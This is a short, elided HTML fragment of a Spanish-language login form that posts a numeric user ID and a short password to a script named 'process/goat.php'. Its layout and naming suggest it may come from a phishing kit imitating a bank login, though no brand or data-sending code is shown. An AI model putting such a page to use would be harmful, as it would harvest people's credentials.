    ...
    <div class="datos">
        ...
        <form action="process/goat.php" method="POST">
            <center>
                ...
                <input type="tel" name="user" id="txtUsuario" style="margin-top:5px;" required minlength="6"
                    maxlength="10" inputmode="numeric">
                <input type="password" name="pass" id="txtPass" style="margin-top:5px;" required minlength="6"
                    maxlength="8">
                ...
                <input type="submit" value="Ingresar"
                    style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br>
